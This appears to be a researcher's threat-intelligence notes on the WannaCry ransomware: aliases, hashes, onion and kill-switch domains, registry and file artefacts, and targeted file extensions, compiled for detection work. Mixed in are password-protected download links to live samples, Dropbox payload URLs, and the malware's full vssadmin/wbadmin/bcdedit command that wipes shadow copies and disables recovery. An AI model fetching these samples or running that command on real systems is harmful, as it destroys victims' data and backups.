@@ -1,0 +1,483 @@
+WannaCry aka..
+
+WannaCrypt, WannaCry, WanaCrypt0r, WCrypt, WCRY, WCryr, Wanna Decryptor, Win32.Trojan-Ransom.WannaCry, Trojan.Ransom.WannaCryptor, Trojan:W32/WannaCryptor.A!Deepguard, Trojan:W32/WannaCryptor.X!Deepguard
+
+File Names:
+109061494281319.bat
+!WannaDecryptor!.exe
+
+https://virustotal.com/en/file/f363c532d7401c75289bbf8e83bca276e7dffdd1b70d5df4167503fcefd3de05/analysis/
+https://virustotal.com/cs/file/b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25/analysis/
+https://www.virustotal.com/en/file/07c44729e2c570b37db695323249474831f5861d45318bf49ccf5d2f5c8ea1cd/analysis/
+https://www.virustotal.com/es/file/3e6de9e2baacf930949647c399818e7a2caea2626df6a468407854aaa515eed9/analysis/
+https://www.virustotal.com/es/file/766d7d591b9ec1204518723a1e5940fd6ac777f606ed64e731fd91b0b4c3d9fc/analysis/
+
+MS17-010 - MS17-010 SMB RCE Detection (ruby[msf] & python):
+https://github.com/RiskSense-Ops/MS17-010/tree/master/scanners
+
+Malware samples:
+
+hxxps://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100
+hxxps://transfer.sh/PnDIl/CYBERed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.EXE
+hxxps://transfer.sh/ZhnxR/CYBER1be0b96d502c268cb40da97a16952d89674a9329cb60bac81a96e01cf7356830.EXE (main dll)
+hxxps://transfer.sh/138W1c/wana.zip (Password:fucknsa)
+
+https://mega.nz/#!VRtRAaZD!BNcDDAsSSAyb7k3IBdTyy1E1CrOBF5RqVf7MlIFucEI (wcry.7z 3.3 MB) (pass mp @Estamos_Fuori)
+
+pass binary blob: 'WNcry@2ol7' (https://twitter.com/rikvduijn/status/863152470679318528)
+
+Detected as:
+
+Gen:Variant.Graftor.374377
+Trojan.GenericKD.5054801
+Gen:Variant.Graftor.369176
+Application:W32/Generic.e889544aff!Online
+Gen:Variant.Ransom.WannaCryptor.1
+Trojan.Ransom.WannaCryptor.A
+Gen:Trojan.Heur.RP.JtW@aePsbmpi
+Trojan.GenericKD.5057843
+Application:W32/Generic.5ff465afaa!Online
+Suspicious:W32/Malware.c5e6c97e27!Online
+Application:W32/Generic.47a9ad4125!Online
+Trojan.Ransom.WannaCryptor.D
+Gen:Trojan.Heur.RP.JtW@aePsbmp
+Trojan.GenericKD.5057554
+Suspicious:W32/Malware.e889544aff!Online
+Suspicious:W32/Malware.5ff465afaa!Online
+Suspicious:W32/Malware.51e4307093!Online
+Application:W32/Generic.e3712f9d19!Online
+
+Registry:
+
+HKLM\SOFTWARE\WanaCrypt0r
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\<random>: “”<ransomware directory>\tasksche.exe””
+HKLM\SOFTWARE\WanaCrypt0r\wd: “<ransomware directory>”
+HKU\S-1-5-21-677641349-3533616285-3951951702-1000\Control Panel\Desktop\Wallpaper: “%APPDATA%\Microsoft\Windows\Themes\TranscodedWallpaper.jpg”
+HKU\S-1-5-21-677641349-3533616285-3951951702-1000\Control Panel\Desktop\Wallpaper: “<ransomware directory>\@WanaDecryptor@.bmp”
+
+File System:
+
+@Please_Read_Me@.txt – Placed inside every folder that contains encrypted files
+@WanaDecryptor@.exe.lnk – Placed inside every folder that contains encrypted files
+%DESKTOP%\@WanaDecryptor@.bmp
+%DESKTOP%\@WanaDecryptor@.exe
+%APPDATA%\tor\cached-certs
+%APPDATA%\tor\cached-microdesc-consensus
+%APPDATA%\tor\cached-microdescs.new
+%APPDATA%\tor\lock
+%APPDATA%\tor\state
+<ransomware directory>\00000000.eky
+<ransomware directory>\00000000.pky
+<ransomware directory>\00000000.res
+<ransomware directory>\@WanaDecryptor@.bmp
+<ransomware directory>\@WanaDecryptor@.exe
+<ransomware directory>\b.wnry
+<ransomware directory>\c.wnry
+<ransomware directory>\f.wnry
+<ransomware directory>\msg\m_bulgarian.wnry
+<ransomware directory>\msg\m_chinese (simplified).wnry
+<ransomware directory>\msg\m_chinese (traditional).wnry
+<ransomware directory>\msg\m_croatian.wnry
+<ransomware directory>\msg\m_czech.wnry
+<ransomware directory>\msg\m_danish.wnry
+<ransomware directory>\msg\m_dutch.wnry
+<ransomware directory>\msg\m_english.wnry
+<ransomware directory>\msg\m_filipino.wnry
+<ransomware directory>\msg\m_finnish.wnry
+<ransomware directory>\msg\m_french.wnry
+<ransomware directory>\msg\m_german.wnry
+<ransomware directory>\msg\m_greek.wnry
+<ransomware directory>\msg\m_indonesian.wnry
+<ransomware directory>\msg\m_italian.wnry
+<ransomware directory>\msg\m_japanese.wnry
+<ransomware directory>\msg\m_korean.wnry
+<ransomware directory>\msg\m_latvian.wnry
+<ransomware directory>\msg\m_norwegian.wnry
+<ransomware directory>\msg\m_polish.wnry
+<ransomware directory>\msg\m_portuguese.wnry
+<ransomware directory>\msg\m_romanian.wnry
+<ransomware directory>\msg\m_russian.wnry
+<ransomware directory>\msg\m_slovak.wnry
+<ransomware directory>\msg\m_spanish.wnry
+<ransomware directory>\msg\m_swedish.wnry
+<ransomware directory>\msg\m_turkish.wnry
+<ransomware directory>\msg\m_vietnamese.wnry
+<ransomware directory>\r.wnry
+<ransomware directory>\s.wnry
+<ransomware directory>\t.wnry
+<ransomware directory>\TaskData\Tor\libeay32.dll
+<ransomware directory>\TaskData\Tor\libevent-2-0-5.dll
+<ransomware directory>\TaskData\Tor\libevent_core-2-0-5.dll
+<ransomware directory>\TaskData\Tor\libevent_extra-2-0-5.dll
+<ransomware directory>\TaskData\Tor\libgcc_s_sjlj-1.dll
+<ransomware directory>\TaskData\Tor\libssp-0.dll
+<ransomware directory>\TaskData\Tor\ssleay32.dll
+<ransomware directory>\TaskData\Tor\taskhsvc.exe
+<ransomware directory>\TaskData\Tor\tor.exe
+<ransomware directory>\TaskData\Tor\zlib1.dll
+<ransomware directory>\taskdl.exe
+<ransomware directory>\taskse.exe
+<ransomware directory>\u.wnry
+C:\@WanaDecryptor@.exe
+
+Indicator type,Indicator,Description
+FileHash-SHA256,b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25,
+FileHash-SHA256,2584e1521065e45ec3c17767c065429038fc6291c091097ea8b22c8a502c41dd,
+FileHash-SHA256,ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa,
+FileHash-SHA256,09a46b3e1be080745a6d8d88d6b5bd351b1c7586ae0dc94d0c238ee36421cafa,
+FileHash-SHA256,24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c,
+FileHash-SHA256,f8812f1deb8001f3b7672b6fc85640ecb123bc2304b563728e6235ccbe782d85,
+FileHash-SHA256,6e2b4a15d133a62c95c1633d5cbf8a25fb165eb2bd38ffbcd049d0db14d0c33c,
+FileHash-MD5,509c41ec97bb81b0567b059aa2f50fe8,
+FileHash-MD5,7bf2b57f2a205768755c07f238fb32cc,
+FileHash-MD5,7f7ccaa16fb15eb1c7399d422f8363e8,
+FileHash-MD5,84c82835a5d21bbcf75a61706d8ab549,
+FileHash-MD5,db349b97c37d22f5ea1d1841e3c89eb4,
+FileHash-MD5,f107a717f76f4f910ae9cb4dc5290594,
+FileHash-SHA1,51e4307093f8ca8854359c0ac882ddca427a813c,
+FileHash-SHA1,87420a2791d18dad3f18be436045280a4cc16fc4,
+FileHash-SHA1,e889544aff85ffaf8b0d0da705105dee7c97fe26,
+FileHash-SHA1,432c1a5353bab4dba67ea620ea6c1a3095c5d4fa,
+FilePath,C:\WINDOWS\tasksche.exe,
+FilePath,C:\Windows\mssecsvc.exe,
+FileHash-SHA1,45356a9dd616ed7161a3b9192e2f318d0ab5ad10,
+FileHash-SHA1,bd44d0ab543bf814d93b719c24e90d8dd7111234,
+FileHash-SHA256,2ca2d550e603d74dedda03156023135b38da3630cb014e3d00b1263358c5f00d,
+FileHash-SHA256,4a468603fdcb7a2eb5770705898cf9ef37aade532a7964642ecd705a74794b79,
+domain,57g7spgrzlojinas.onion,
+domain,76jdd2ir2embyv47.onion,
+domain,cwwnhwhlz52maqm7.onion,
+domain,gx7ekbenv2riucmf.onion,
+domain,sqjolphimrr7jqw6.onion,
+domain,xxlvbrloxvriy2c5.onion,
+domain,cwwnhwhlz52ma.onion,
+FileHash-MD5,4fef5e34143e646dbf9907c4374276f5,
+FileHash-MD5,5bef35496fcbdbe841c82f4d1ab8b7c2,
+FileHash-MD5,775a0631fb8229b2aa3d7621427085ad,
+FileHash-MD5,8495400f199ac77853c53b5a3f278f3e,
+FileHash-MD5,86721e64ffbd69aa6944b9672bcabb6d,
+FileHash-MD5,8dd63adb68ef053e044a5a2f46e0d2cd,
+FileHash-MD5,b0ad5902366f860f85b892867e5b1e87,
+FileHash-MD5,d6114ba5f10ad67a4131ab72531f02da,
+FileHash-MD5,e372d07207b4da75b3434584cd9f3450,
+FileHash-MD5,f529f4556a5126bba499c26d67892240,
+FileHash-MD5,9C7C7149387A1C79679A87DD1BA755BC
+CVE,CVE-2017-0144,
+FileHash-SHA256,149601e15002f78866ab73033eb8577f11bd489a4cea87b10c52a70fdf78d9ff,
+FileHash-SHA256,4186675cb6706f9d51167fb0f14cd3f8fcfb0065093f62b10a15f7d9a6c8d982,
+FileHash-SHA256,593bbcc8f34047da9960b8456094c0eaf69caaf16f1626b813484207df8bd8af,
+FileHash-SHA256,6bf1839a7e72a92a2bb18fbedf1873e4892b00ea4b122e48ae80fac5048db1a7,
+FileHash-SHA256,b3c39aeb14425f137b5bd0fd7654f1d6a45c0e8518ef7e209ad63d8dc6d0bac7,
+FileHash-SHA256,c365ddaa345cfcaff3d629505572a484cff5221933d68e4a52130b8bb7badaf9,
+FileHash-SHA256,7a828afd2abf153d840938090d498072b7e507c7021e4cdd8c6baf727cafc545,
+FileHash-SHA256,a897345b68191fd36f8cefb52e6a77acb2367432abb648b9ae0a9d708406de5b,
+FileHash-SHA256,b43b234012b8233b3df6adb7c0a3b2b13cc2354dd6de27e092873bf58af2693c,
+FileHash-SHA256,c73633e55a1d66af88a3dc2d46e7d47e0a47ce0bab0930a70b97b003adafc9af,
+FileHash-SHA256,f5cbff5c100866dd744dcbb68ee65e711f86c257dfcc41790a8f63759220881e,
+FileHash-SHA256,4A468603FDCB7A2EB5770705898CF9EF37AADE532A7964642ECD705A74794B79,
+FileHash-SHA256,B9C5D4339809E0AD9A00D4D3DD26FDF44A32819A54ABF846BB9B560D81391C25,
+FileHash-SHA256,d8a9879a99ac7b12e63e6bcae7f965fbf1b63d892a8649ab1d6b08ce711f7127,
+FileHash-SHA256,11fd66b4e1090c9af7ea59daf7f62fa6ae3090c10042aa0826eacb3e226636ad,
+FileHash-SHA256,88be9ee3ce0f85086aec1f2f8409247e8ab4a2a7c8a07af851f8df9814adeee5,
+FileHash-SHA256,de1fb3f687161900f15243c0912a40bacf4df938a718c75a73f80ffc3bf3a2d3,
+FileHash-SHA256,63c8a30963265353532d80a41cae5d54b31e5c2d6b2a92551d6f6dcadd0dedeb,
+FileHash-SHA256,7c465ea7bcccf4f94147add808f24629644be11c0ba4823f16e8c19e0090f0ff,
+FileHash-SHA256,9b60c622546dc45cca64df935b71c26dcf4886d6fa811944dbc4e23db9335640,
+FileHash-SHA256,5dee2ac983640d656f9c0ef2878ee34cda5e82a52d3703f84278ac372877346d,
+FileHash-SHA256,5ad4efd90dcde01d26cc6f32f7ce3ce0b4d4951d4b94a19aa097341aff2acaec,
+FileHash-SHA256,7bb9ea2c0f53fa96883c54fa4b107764a6319f6026e4574c9feec2cb7d9e7d21,
+FileHash-SHA256,11011a590796f6c52b046262f2f60694310fa71441363d9116ada7248e58509a,
+FileHash-SHA256,22ccdf145e5792a22ad6349aba37d960db77af7e0b6cae826d228b8246705092,
+FileHash-SHA256,11d0f63c06263f50b972287b4bbd1abe0089bc993f73d75768b6b41e3d6f6d49,
+FileHash-SHA256,31c2024d0df684a968115e4c3fc5703ef0ea2de1b69ece581589e86ba084568a,
+FileHash-SHA256,ac7f0fb9a7bb68640612567153a157e91d457095eadfd2a76d27a7f65c53ba82,
+FileHash-SHA256,e8450dd6f908b23c9cbd6011fe3d940b24c0420a208d6924e2d920f92c894a96,
+FileHash-SHA256,e14f1a655d54254d06d51cd23a2fa57b6ffdf371cf6b828ee483b1b1d6d21079,
+FileHash-SHA256,16493ecc4c4bc5746acbe96bd8af001f733114070d694db76ea7b5a0de7ad0ab,
+FileHash-SHA256,b47e281bfbeeb0758f8c625bed5c5a0d27ee8e0065ceeadd76b0010d226206f0,
+FileHash-SHA256,b66db13d17ae8bcaf586180e3dcd1e2e0a084b6bc987ac829bbff18c3be7f8b4,
+FileHash-SHA256,3dcbb0c3ede91f8f2e9efb0680fe0d479ff9b9cd94906a86dec415f760c163e1,
+FileHash-SHA256,f7c7b5e4b051ea5bd0017803f40af13bed224c4b0fd60b890b6784df5bd63494,
+FileHash-MD5,05a00c320754934782ec5dec1d5c0476,
+FileHash-MD5,26b205ffe4adaadbb442442cae653bdd,
+FileHash-MD5,29365f675b69ffa0ec17ad00649ce026,
+FileHash-MD5,46d140a0eb13582852b5f778bb20cf0e,
+FileHash-MD5,5ad5075d8d66cd7c05899d8044fdab65,
+FileHash-MD5,835fff032c51075c0c27946f6ebd64a3,
+FileHash-MD5,83e5a812a371e0790066c6fb038f0d26,
+FileHash-MD5,f9992dfb56a9c6c20eb727e6a26b0172,
+FileHash-MD5,f9cee5e75b7f1298aece9145ea80a1d2,
+FileHash-MD5,66ddbd108b0c347550f18bb953e1831d,
+
+24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c
+32f24601153be0885f11d62e0a8a2f0280a2034fc981d8184180c5d3b1b9e8cf
+d5dcd28612f4d6ffca0cfeaefd606bcf 
+
+https://transfer.sh/Jj2sK/CYBER3463ea99389ef4836cfe0565539ee80c4c3a8159930c408f86147a59632d593a.EXE
+3463ea99389ef4836cfe0565539ee80c4c3a8159930c408f86147a59632d593a
+
+
+DarkoderCrypt0r
+Sample: 2ffd9ba7b5dbccf734da02498fa2a6af8caaf8b9f98d4b32bc226516eee5c832
+Released: 5/14/17
+
+Aron WanaCrypt0r 2.0 Generator v1.0
+Sample: b46c6addef8894d5079f592152481d259338175806eb9a983ddb8edb9ec5aa44
+Released: 5/14/17
+
+Wanna Crypt v2.5
+Sample: 925b3acaa3252bf4d660eab22856fff155f3106c2fee7567711cb34374b499f3
+Released: 5/14/17
+
+WannaCrypt 4.0
+Sample: cd7542f2d7f2285ab524a57bc04ae1ad9306a15b9efbf56ea7b002d99d4b974f
+Released: 5/14/17
+
+Wana Decrypt0r 2.0
+Sample: a4704be3a77f989693188a4a505b62719ffe87718f8891ab5d3e1de1b1a57572
+Released: 5/15/17
+
+Sinkholed Domain / Kill Switch (https://twitter.com/darienhuss/status/863083680528576512)
+www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com
+
+New kill switch:
+ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com
+Source: https://twitter.com/msuiche/status/863730377642442752
+
+www.ayylmaoTJHSSTasdfasdfasdfasdfasdfasdfasdf.com
+
+[23:52:55] <Cedders1> So there's one variant needing www.ayylmaoTJHSSTasdfasdfasdfasdfasdfasdfasdf.com to bail, and another needing it not to exist?  So appears to be registered to "Aviran Hazum"... best tactic to prevent spread would presumably to have it resolve 50% of the time.
+
+https://www.bleepingcomputer.com/news/security/with-the-success-of-wannacry-imitations-are-quickly-in-development/
+
+Strings:
+
+https://twitter.com/laurilove/status/863180383340429312
+https://pastebin.com/raw/0LrH05y2
+
+Script from memory : 
+0x1000d628, 218, @echo off
+echo SET ow = WScript.CreateObject("WScript.Shell")> m.vbs
+echo SET om = ow.CreateShortcut("%s%s")>> m.vbs
+echo om.TargetPath = "%s%s">> m.vbs
+echo om.Save>> m.vbs
+cscript.exe //nologo m.vbs
+del m.vbs
+
+u.wnry : 
+
+.data:00420FD8 aCVssadminDelet db '/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet' 
+
+
+aFailedToSendYo db 'Failed to send your message!',0Ah
+.data:00421318 ; char aYourMessageHas[]
+.data:00421318 aYourMessageHas db 'Your message has been sent successfully!',0
+.data:00421344 ; char aYouAreSendingT[]
+.data:00421344 aYouAreSendingT db 'You are sending too many mails! Please try again %d minutes later'
+
+
+
+Process: 
+00:34 < nulldot> 0x1000ef48, 24, BAYEGANSRV\administrator
+00:34 < nulldot> 0x1000ef7a, 13, Smile465666SA
+00:34 < nulldot> 0x1000efc0, 19, wanna18@hotmail.com
+00:34 < nulldot> 0x1000eff2, 34, 1QAc9S5EmycqjzzWDc1yiWzr9jJLC8sLiY
+00:34 < nulldot> 0x1000f024, 22, sqjolphimrr7jqw6.onion
+00:34 < nulldot> 0x1000f088, 52, https://www.dropbox.com/s/deh8s52zazlyy94/t.zip?dl=1
+00:34 < nulldot> 0x1000f0ec, 67, https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip
+00:34 < nulldot> 0x1000f150, 52, https://www.dropbox.com/s/c1gn29iy8erh1ks/m.rar?dl=1
+00:34 < nulldot> 0x1000f1b4, 12, 00000000.eky
+00:34 < nulldot> 0x1000f270, 12, 00000000.pky
+00:34 < nulldot> 0x1000f2a4, 12, 00000000.res
+
+
+
+Target_Files: 
+data:1000D1F8 aCryptacquireco db 'CryptAcquireContextA',0 ; DATA XREF: sub_10004440+2Do
+.data:1000D20D                 align 10h
+.data:1000D210                 dd offset a_doc         ; ".doc"
+.data:1000D214                 dd offset a_docx        ; ".docx"
+.data:1000D218                 dd offset a_xls         ; ".xls"
+.data:1000D21C                 dd offset a_xlsx        ; ".xlsx"
+.data:1000D220                 dd offset a_ppt         ; ".ppt"
+.data:1000D224                 dd offset a_pptx        ; ".pptx"
+.data:1000D228                 dd offset a_pst         ; ".pst"
+.data:1000D22C                 dd offset a_ost         ; ".ost"
+.data:1000D230                 dd offset a_msg         ; ".msg"
+.data:1000D234                 dd offset a_eml         ; ".eml"
+.data:1000D238                 dd offset a_vsd         ; ".vsd"
+.data:1000D23C                 dd offset a_vsdx        ; ".vsdx"
+.data:1000D240                 dd offset a_txt         ; ".txt"
+.data:1000D244                 dd offset a_csv         ; ".csv"
+.data:1000D248                 dd offset a_rtf         ; ".rtf"
+.data:1000D24C                 dd offset a_123         ; ".123"
+.data:1000D250                 dd offset a_wks         ; ".wks"
+.data:1000D254                 dd offset a_wk1         ; ".wk1"
+.data:1000D258                 dd offset a_pdf         ; ".pdf"
+.data:1000D25C                 dd offset a_dwg         ; ".dwg"
+.data:1000D260                 dd offset a_onetoc2     ; ".onetoc2"
+.data:1000D264                 dd offset a_snt         ; ".snt"
+.data:1000D268                 dd offset a_jpeg        ; ".jpeg"
+.data:1000D26C                 dd offset a_jpg         ; ".jpg"
+.data:1000D274                 dd offset a_docb        ; ".docb"
+.data:1000D278                 dd offset a_docm        ; ".docm"
+.data:1000D27C                 dd offset a_dot         ; ".dot"
+.data:1000D280                 dd offset a_dotm        ; ".dotm"
+.data:1000D284                 dd offset a_dotx        ; ".dotx"
+.data:1000D288                 dd offset a_xlsm        ; ".xlsm"
+.data:1000D28C                 dd offset a_xlsb        ; ".xlsb"
+.data:1000D290                 dd offset a_xlw         ; ".xlw"
+.data:1000D294                 dd offset a_xlt         ; ".xlt"
+.data:1000D298                 dd offset a_xlm         ; ".xlm"
+.data:1000D29C                 dd offset a_xlc         ; ".xlc"
+.data:1000D2A0                 dd offset a_xltx        ; ".xltx"
+.data:1000D2A4                 dd offset a_xltm        ; ".xltm"
+.data:1000D2A8                 dd offset a_pptm        ; ".pptm"
+.data:1000D2AC                 dd offset a_pot         ; ".pot"
+.data:1000D2B0                 dd offset a_pps         ; ".pps"
+.data:1000D2B4                 dd offset a_ppsm        ; ".ppsm"
+.data:1000D2B8                 dd offset a_ppsx        ; ".ppsx"
+.data:1000D2BC                 dd offset a_ppam        ; ".ppam"
+.data:1000D2C0                 dd offset a_potx        ; ".potx"
+.data:1000D2C4                 dd offset a_potm        ; ".potm"
+.data:1000D2C8                 dd offset a_edb         ; ".edb"
+.data:1000D2CC                 dd offset a_hwp         ; ".hwp"
+.data:1000D2D0                 dd offset a_602         ; ".602"
+.data:1000D2D4                 dd offset a_sxi         ; ".sxi"
+.data:1000D2D8                 dd offset a_sti         ; ".sti"
+.data:1000D2DC                 dd offset a_sldx        ; ".sldx"
+.data:1000D2E0                 dd offset a_sldm        ; ".sldm"
+.data:1000D2E4                 dd offset a_sldm        ; ".sldm"
+.data:1000D2E8                 dd offset a_vdi         ; ".vdi"
+.data:1000D2EC                 dd offset a_vmdk        ; ".vmdk"
+.data:1000D2F0                 dd offset a_vmx         ; ".vmx"
+.data:1000D2F4                 dd offset a_gpg         ; ".gpg"
+.data:1000D2F8                 dd offset a_aes         ; ".aes"
+.data:1000D2FC                 dd offset a_arc         ; ".ARC"
+.data:1000D300                 dd offset a_paq         ; ".PAQ"
+.data:1000D304                 dd offset a_bz2         ; ".bz2"
+.data:1000D308                 dd offset a_tbk         ; ".tbk"
+.data:1000D30C                 dd offset a_bak         ; ".bak"
+.data:1000D310                 dd offset a_tar         ; ".tar"
+.data:1000D314                 dd offset a_tgz         ; ".tgz"
+.data:1000D318                 dd offset a_gz          ; ".gz"
+.data:1000D31C                 dd offset a_7z          ; ".7z"
+.data:1000D320                 dd offset a_rar         ; ".rar"
+.data:1000D324                 dd offset a_zip         ; ".zip"
+.data:1000D328                 dd offset a_backup      ; ".backup"
+.data:1000D32C                 dd offset a_iso         ; ".iso"
+.data:1000D330                 dd offset a_vcd         ; ".vcd"
+.data:1000D334                 dd offset a_bmp         ; ".bmp"
+.data:1000D338                 dd offset a_png         ; ".png"
+.data:1000D33C                 dd offset a_gif         ; ".gif"
+.data:1000D340                 dd offset a_raw         ; ".raw"
+.data:1000D344                 dd offset a_cgm         ; ".cgm"
+.data:1000D348                 dd offset a_tif         ; ".tif"
+.data:1000D34C                 dd offset a_tiff        ; ".tiff"
+.data:1000D350                 dd offset a_nef         ; ".nef"
+.data:1000D354                 dd offset a_psd         ; ".psd"
+.data:1000D358                 dd offset a_ai          ; ".ai"
+.data:1000D35C                 dd offset a_svg         ; ".svg"
+.data:1000D360                 dd offset a_djvu        ; ".djvu"
+.data:1000D364                 dd offset a_m4u         ; ".m4u"
+.data:1000D368                 dd offset a_m3u         ; ".m3u"
+.data:1000D36C                 dd offset a_mid         ; ".mid"
+.data:1000D370                 dd offset a_wma         ; ".wma"
+.data:1000D374                 dd offset a_flv         ; ".flv"
+.data:1000D378                 dd offset a_3g2         ; ".3g2"
+.data:1000D37C                 dd offset a_mkv         ; ".mkv"
+.data:1000D380                 dd offset a_3gp         ; ".3gp"
+.data:1000D384                 dd offset a_mp4         ; ".mp4"
+.data:1000D388                 dd offset a_mov         ; ".mov"
+.data:1000D38C                 dd offset a_avi         ; ".avi"
+.data:1000D390                 dd offset a_asf         ; ".asf"
+.data:1000D394                 dd offset a_mpeg        ; ".mpeg"
+.data:1000D398                 dd offset a_vob         ; ".vob"
+.data:1000D39C                 dd offset a_mpg         ; ".mpg"
+.data:1000D3A0                 dd offset a_wmv         ; ".wmv"
+.data:1000D3A4                 dd offset a_fla         ; ".fla"
+.data:1000D3A8                 dd offset a_swf         ; ".swf"
+.data:1000D3AC                 dd offset a_wav         ; ".wav"
+.data:1000D3B0                 dd offset a_mp3         ; ".mp3"
+.data:1000D3B4                 dd offset a_sh          ; ".sh"
+.data:1000D3B8                 dd offset a_class       ; ".class"
+.data:1000D3BC                 dd offset a_jar         ; ".jar"
+.data:1000D3C0                 dd offset a_java        ; ".java"
+.data:1000D3C4                 dd offset a_rb          ; ".rb"
+.data:1000D3C8                 dd offset a_asp         ; ".asp"
+.data:1000D3CC                 dd offset a_php         ; ".php"
+.data:1000D3D0                 dd offset a_jsp         ; ".jsp"
+.data:1000D3D4                 dd offset a_brd         ; ".brd"
+.data:1000D3D8                 dd offset a_sch         ; ".sch"
+.data:1000D3DC                 dd offset a_dch         ; ".dch"
+.data:1000D3E0                 dd offset a_dip         ; ".dip"
+.data:1000D3E4                 dd offset a_pl          ; ".pl"
+.data:1000D3E8                 dd offset a_vb          ; ".vb"
+.data:1000D3EC                 dd offset a_vbs         ; ".vbs"
+.data:1000D3F0                 dd offset a_ps1         ; ".ps1"
+.data:1000D3F4                 dd offset a_bat         ; ".bat"
+.data:1000D3F8                 dd offset a_cmd         ; ".cmd"
+.data:1000D3FC                 dd offset a_js          ; ".js"
+.data:1000D400                 dd offset a_asm         ; ".asm"
+.data:1000D404                 dd offset a_h           ; ".h"
+.data:1000D408                 dd offset a_pas         ; ".pas"
+.data:1000D40C                 dd offset a_cpp         ; ".cpp"
+.data:1000D410                 dd offset a_c           ; ".c"
+.data:1000D414                 dd offset a_cs          ; ".cs"
+.data:1000D418                 dd offset a_suo         ; ".suo"
+.data:1000D41C                 dd offset a_sln         ; ".sln"
+.data:1000D420                 dd offset a_ldf         ; ".ldf"
+.data:1000D424                 dd offset a_mdf         ; ".mdf"
+.data:1000D428                 dd offset a_ibd         ; ".ibd"
+.data:1000D42C                 dd offset a_myi         ; ".myi"
+.data:1000D430                 dd offset a_myd         ; ".myd"
+.data:1000D434                 dd offset a_frm         ; ".frm"
+.data:1000D438                 dd offset a_odb         ; ".odb"
+.data:1000D43C                 dd offset a_dbf         ; ".dbf"
+.data:1000D440                 dd offset a_db          ; ".db"
+.data:1000D444                 dd offset a_mdb         ; ".mdb"
+.data:1000D448                 dd offset a_accdb       ; ".accdb"
+.data:1000D44C                 dd offset a_sql         ; ".sql"
+.data:1000D450                 dd offset a_sqlitedb    ; ".sqlitedb"
+.data:1000D454                 dd offset a_sqlite3     ; ".sqlite3"
+.data:1000D458                 dd offset a_asc         ; ".asc"
+.data:1000D45C                 dd offset a_lay6        ; ".lay6"
+.data:1000D460                 dd offset a_lay         ; ".lay"
+.data:1000D464                 dd offset a_mml         ; ".mml"
+.data:1000D468                 dd offset a_sxm         ; ".sxm"
+.data:1000D46C                 dd offset a_otg         ; ".otg"
+.data:1000D470                 dd offset a_odg         ; ".odg"
+.data:1000D474                 dd offset a_uop         ; ".uop"
+.data:1000D478                 dd offset a_std         ; ".std"
+.data:1000D47C                 dd offset a_sxd         ; ".sxd"
+.data:1000D480                 dd offset a_otp         ; ".otp"
+.data:1000D484                 dd offset a_odp         ; ".odp"
+.data:1000D488                 dd offset a_wb2         ; ".wb2"
+.data:1000D48C                 dd offset a_slk         ; ".slk"
+.data:1000D490                 dd offset a_dif         ; ".dif"
+.data:1000D494                 dd offset a_stc         ; ".stc"
+.data:1000D498                 dd offset a_sxc         ; ".sxc"
+.data:1000D49C                 dd offset a_ots         ; ".ots"
+.data:1000D4A0                 dd offset a_ods         ; ".ods"
+.data:1000D4A4                 dd offset a_3dm         ; ".3dm"
+.data:1000D4A8                 dd offset a_max         ; ".max"
+.data:1000D4AC                 dd offset a_3ds         ; ".3ds"
+.data:1000D4B0                 dd offset a_uot         ; ".uot"
+.data:1000D4B4                 dd offset a_stw         ; ".stw"
+.data:1000D4B8                 dd offset a_sxw         ; ".sxw"
+.data:1000D4BC                 dd offset a_ott         ; ".ott"
+.data:1000D4C0                 dd offset a_odt         ; ".odt"
+.data:1000D4C4                 dd offset a_pem         ; ".pem"
+.data:1000D4C8                 dd offset a_p12         ; ".p12"
+.data:1000D4CC                 dd offset a_csr         ; ".csr"
+.data:1000D4D0                 dd offset a_crt         ; ".crt"
+.data:1000D4D4                 dd offset a_key         ; ".key"
+.data:1000D4D8                 dd offset a_pfx         ; ".pfx"
+.data:1000D4DC                 dd offset a_der         ; ".der"
+
+
+New Variant with Kill Switch:
+
+32f24601153be0885f11d62e0a8a2f0280a2034fc981d8184180c5d3b1b9e8cf
+
+more info: https://blog.comae.io/wannacry-new-variants-detected-b8908fefea7e
